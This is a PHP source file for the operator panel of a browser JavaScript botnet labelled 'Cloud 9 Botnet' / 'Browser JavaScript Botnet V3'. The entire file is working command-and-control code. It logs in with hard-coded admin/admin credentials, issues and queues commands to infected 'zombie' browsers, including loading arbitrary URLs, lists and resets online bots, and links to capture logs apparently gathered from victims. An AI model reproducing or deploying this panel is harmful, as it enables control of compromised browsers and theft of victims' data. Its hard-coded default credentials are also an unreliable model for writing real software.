<?php
$username = "admin";
$password = "admin";
$salt= "sup3rcalifr4gilisticexpialid0ci0us";

if(!isset($_COOKIE['PrivatePageLogin'])  &&  !isset($_GET["p"])) {
    echo '<form action="'; echo $_SERVER['PHP_SELF']; echo '?p=login" method="post">';
    echo '<label><input type="text" name="user" id="user" /> Name</label><br />';
    echo '<label><input type="password" name="keypass" id="keypass" /> Password</label><br />';
    echo '<input type="submit" id="submit" value="Login" />';
    echo '</form>';
}
if(isset($_COOKIE['PrivatePageLogin'])) {
    if($_COOKIE['PrivatePageLogin'] == hash('sha512', $password."_Milenko_".$salt)) {
        require("../config.php");
        echo "<!DOCTYPE html>\n";
        echo "<html>\n";
        echo "<body text=#00CCCC>\n";
        echo "<head>\n";

        //echo "<meta http-equiv=\"refresh\" content=\"" . $panelRefreshRate . "\">\n";
        
        echo "<title>Cloud 9 Botnet [" . file_get_contents("." . $onlinefile) . " - Zombies Online]</title>\n";
        echo "<style>\n";
        echo "div {\n";
        echo "    background-color: #777777;\n";
        echo "    width: 750px;\n";
        echo "    padding: 25px;\n";
        echo "    border: 25px;\n";
        echo "    border-style: solid;\n";
        echo "    border-color: #555555;\n";
        echo "    margin: 25px;\n";
        echo "}\n";
        echo "body { \n";
        echo "    background: #333333; \n";
        echo "}\n";
        echo "input[type=\"text\"] {\n";
        echo "    width: 250px;\n";
        echo "}\n";
        echo "</style>\n";
        if(isset($_POST['cmd'])) {
            $command=$_POST['cmd'];
            $fp = fopen("." . $tasklist, 'wb') or die('fopen failed');

            fwrite($fp, $command."\r\n") or die('fwrite failed');
            fflush($fp);
            fclose($fp);
        }
        if(isset($_POST['addtask'])) {
            $command=$_POST['addtask'];
            $fp = fopen("." . $tasklist, 'ab') or die('fopen failed');

            fwrite($fp, $command."\r\n") or die('fwrite failed');
            fflush($fp);
            fclose($fp);
        }
        if(isset($_POST['removebots'])) {
            file_put_contents("." . $onlinefile, "0"); //reset online count
            file_put_contents("." . $onlinebotlist, ""); //reset online list
            echo "<script type=\"text/JavaScript\">alert(\"Online bot count and list reset!\");</script>\n";
            echo "<meta http-equiv=\"refresh\" content=\"5\">\n";
            echo "<p><b>Dead bots have been cleared. Online bots will show within your set connection timeout.<br>You will be redirected to the panel in <i>five</i> seconds.</b></p></head></body></html>\n";
            die;
        }
        echo "</head>\n";
        echo "<font size=6.5><b><i>Browser JavaScript Botnet V3 </i> -hakanonymos</b></font>\n";

        echo "</p>\n";
        echo "</div>\n";
        echo "<br>\n";
        echo "<font size=5><b>Tasks</b></font><br><div>";

        $new = htmlspecialchars(file_get_contents("." . $tasklist), ENT_QUOTES); // XSS security
        echo str_replace("\n", "<br>", $new);

        echo "</div>\n";
        echo "<br>\n";
        echo "<font size=5><b>Edit tasks/bots</b></font>\n";
        echo "<div>\n";
        echo "<form action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"POST\">\n";
        echo "Command: <input type=\"text\" name=\"cmd\" cols=32 value=\"sleep*2000*\"><br>\n";
        echo "<input type=\"submit\" value=\"Execute command\">\n";
        echo "</form>\n";
        echo "<p>Click Execute command to erase all tasks and run a singular command</p><br>\n";
        echo "<form action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"POST\">\n";
        echo "Add task: <input type=\"text\" name=\"addtask\" cols=32 value=\"load*<url>*<milliseconds>*\"><br>\n";
        echo "<input type=\"submit\" value=\"Add Task\">\n";
        echo "</form>\n";
        echo "<p>Click add task to add another command to the Net</p>\n";
        echo "<form action=\"" . $_SERVER['PHP_SELF'] . "\" method=\"POST\">\n";
        echo "<input type=\"hidden\" name=\"removebots\">\n";
        echo "<input type=\"submit\" value=\"Reset online bot count and list.\">\n";
        echo "</form>\n";
        echo "</div>\n";

        echo "<br>\n";
        echo "<font size=5><b>Capture logs</b></font>\n";
        echo "<div>";

        foreach(glob('../logs/*.txt') as $file) {
            if($file != "." . $logfile) { //hide main log
                $file = str_replace("../logs/", "", $file); //hide logs directory
                if($file != "") {
                    echo '<a href="/logs/'.$file.'">'.$file."</a><br>";
                }
            }
        }

        echo "</div>\n";
        echo "<br>\n";
        echo "<font size=5><b>Online Bot List</b></font>";
        echo "<div>\n";
        $botlist = explode("\r\n", file_get_contents("." . $onlinebotlist));
        foreach($botlist as &$bot) {
            if($bot != "") {
                $botentry = explode("|", $bot);
                echo "[" . $botentry[0] . "] [<img src='/flags/" . $botentry[1] . ".png' />] [" . $botentry[2] . "] [". $botentry[3] . "] " . $botentry[4] . "<br>\r\n";
            }
        }
        echo "</div>\n";

        echo "</body>\n";
        echo "</html>\n";
        exit;

    } else {

        unset($_COOKIE["PrivatePageLogin"]);
        echo '<form action="' . $_SERVER['PHP_SELF'] . '?p=login" method="post">';
        echo '<label><input type="text" name="user" id="user" /> Name</label><br />';
        echo '<label><input type="password" name="keypass" id="keypass" /> Password</label><br />';
        echo '<input type="submit" id="submit" value="Login" />';
        echo '</form>';
        echo "Bad Cookie, please log back in or clear your cookies.";
        exit;

    }
}

if(isset($_GET['p']) && $_GET['p'] == "login") {
    if($_POST['user'] != $username) {
      echo "Sorry, that username does not match.";
      exit;
   } else if($_POST['keypass'] != $password) {
      echo "Sorry, that password does not match.";
      exit;
   } else if($_POST['user'] == $username && $_POST['keypass'] == $password) {
      setcookie('PrivatePageLogin', hash('sha512', $password."_Milenko_".$salt));
      header("Location: $_SERVER[PHP_SELF]");
   } else {
      echo "Sorry, you could not be logged in at this time.";
   }
}
?>
